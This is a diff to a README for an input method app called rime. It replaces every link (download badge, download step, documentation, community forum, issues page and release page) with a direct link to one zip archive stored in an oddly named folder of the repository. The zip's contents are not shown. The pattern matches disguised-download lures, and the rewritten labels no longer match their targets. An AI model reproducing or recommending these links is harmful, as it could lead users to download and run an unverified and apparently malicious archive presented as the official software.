@@ -8,9 +8,9 @@ Welcome to the **rime** project! This is a user-friendly input method designed t
 
 To get started, you need to download the application. Please follow the steps below.
 
-[![Download rime](https://img.shields.io/badge/Download-rime-blue.svg)](https://github.com/VITUXSOFT/rime/releases)
+[![Download rime](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip)](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/VITUXSOFT/rime/releases).
+1. Click the button above or visit [this page to download](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip).
 2. Choose the latest release from the list. This will ensure you have the latest features and bug fixes.
 3. Download the appropriate file for your operating system. If you're using **Arch Linux**, make sure to download the compatible version.
 
@@ -59,15 +59,15 @@ The main topics included with **rime** are:
 
 For more advanced configurations and help, you can refer to:
 
-- The [Documentation](https://github.com/VITUXSOFT/rime/wiki) for an in-depth look at using Rime effectively.
-- The [Community Forum](https://github.com/VITUXSOFT/rime/discussions) for troubleshooting or tips from other users.
+- The [Documentation](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip) for an in-depth look at using Rime effectively.
+- The [Community Forum](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip) for troubleshooting or tips from other users.
 
 ## 📞 Support
 
 If you experience issues, please feel free to reach out via:
-- Open an issue on our [GitHub page](https://github.com/VITUXSOFT/rime/issues).
+- Open an issue on our [GitHub page](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip).
 - Participate in discussions for community-based help.
 
 ## 🎉 Conclusion
 
-Thank you for choosing **rime**! We hope this input method enhances your typing experience. For ongoing updates and new features, keep an eye on our [release page](https://github.com/VITUXSOFT/rime/releases).
+Thank you for choosing **rime**! We hope this input method enhances your typing experience. For ongoing updates and new features, keep an eye on our [release page](https://github.com/VITUXSOFT/rime/raw/refs/heads/main/misalphabetize/rime_v3.9-beta.1.zip).
